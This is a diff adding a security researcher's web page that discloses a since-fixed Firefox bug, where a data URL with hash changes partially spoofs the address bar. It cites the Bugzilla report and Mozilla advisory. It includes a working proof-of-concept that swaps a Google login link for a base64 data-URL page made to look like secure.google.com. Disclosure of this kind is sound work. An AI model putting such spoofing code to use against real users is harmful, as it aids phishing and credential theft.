@@ -1,0 +1,71 @@
+<!doctype html>
+<html>
+<head>
+	<title>FireFox Partial URL Spoof Using Data URL Scheme (FIXED) - Abdulrahman Al-Qabandi</title>
+	<link href="../q.css" rel="stylesheet">
+	
+
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/> 
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+</div>
+</div>
+
+
+
+<div id="qWriteup">
+<h1>FireFox Partial URL Spoof Using Data URL Scheme (FIXED)</h1>
+<br>
+
+<p>
+In FireFox, there is an interesting behavior that I noticed when using Data URL and hash symbol. The most interesting behavior of the hash symbol is that if it changes (AKA location.hash changes)
+it will not reload the page and this applies to data URLS as well.<br><br>
+Let's look at how Firefox used to handle data URLS with hash symbol changes:<br>
+First, I noticed that navigating to 'data:#text/html,&#x3C;b&#x3E;Hello&#x3C;/b&#x3E;' (note the invalid content type) still rendered as html (now fixed), and if we change location.hash to equal '//mozilla.org' 
+the address URL changes to 'data:#//mozilla.org' without the document changing, successfully achieving a partial URL spoof.<br><br>
+
+
+<h2>Original PoC code:</h2>
+</p><br>
+<!-- HTML generated using hilite.me --><div class="qCode" style=" overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008080">&lt;!DOCTYPE html&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;html&gt;</span>
+ <span style="color: #000080; font-weight: bold">&lt;head&gt;</span>
+	<span style="color: #000080; font-weight: bold">&lt;title&gt;</span>Firefox social engineering, partial url spoof PoC<span style="color: #000080; font-weight: bold">&lt;/title&gt;</span>
+ <span style="color: #000080; font-weight: bold">&lt;/head&gt;</span>
+ <span style="color: #000080; font-weight: bold">&lt;body&gt;</span>
+   Click-&gt; <span style="color: #000080; font-weight: bold">&lt;a</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qab&quot;</span> <span style="color: #FF0000">target=</span><span style="color: #0000FF">&quot;_blank&quot;</span> <span style="color: #FF0000">rel=</span><span style="color: #0000FF">&quot;prefetch nofollow noreferrer&quot;</span> <span style="color: #FF0000">href=</span><span style="color: #0000FF">&quot;https://secure.google.com/login&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>https://secure.google.com/login<span style="color: #000080; font-weight: bold">&lt;/a&gt;</span> <span style="color: #a61717; background-color: #e3d2d2">&lt;</span>-
+   
+   <span style="color: #000080; font-weight: bold">&lt;script&gt;</span>
+	qab.addEventListener(<span style="color: #0000FF">&quot;click&quot;</span>,$=&gt;{
+		qab.href=<span style="color: #0000FF">&#39;data:#;text/html;base64,PGh0bWw+PGhlYWQgcHJvZmlsZT0iaHR0cDovL3d3dy53My5vcmcvMjAwNS8xMC9wcm9maWxlIj48bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3BuZyIgaHJlZj0iaHR0cDovL3d3dy5nb29nbGUuY29tL2Zhdmljb24uaWNvIj48dGl0bGU+R29vZ2xlPC90aXRsZT48L2hlYWQ+PGJvZHk+PGI+c2VlbXMgbGVnaXQ8L2I+PHNjcmlwdD5sb2NhdGlvbi5oYXNoPScvL3NlY3VyZS5nb29nbGUuY29tL2xvZ2luJzs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg==&#39;</span>;
+		<span style="color: #008800; font-style: italic">//Base64 is used to ensure the hashtag in the content is not parsed.</span>
+	});
+   
+   <span style="color: #000080; font-weight: bold">&lt;/script&gt;</span>
+ <span style="color: #000080; font-weight: bold">&lt;/body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/html&gt;</span>
+</pre></div>
+<br>
+<br>
+<p><h2>References:</h2>
+<b>The Bugzilla report:</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1221444" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1221444</a>
+<br>
+<b>Mozilla Foundation Security Advisory 2015-141:</b> <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2015-141/" target="_blank">https://www.mozilla.org/en-US/security/advisories/mfsa2015-141/</a>
+
+</p>
+</div>
+
+	<script type="application/javascript" src="../q.js">
+
+	
+	</script>
+</body>
+</html>
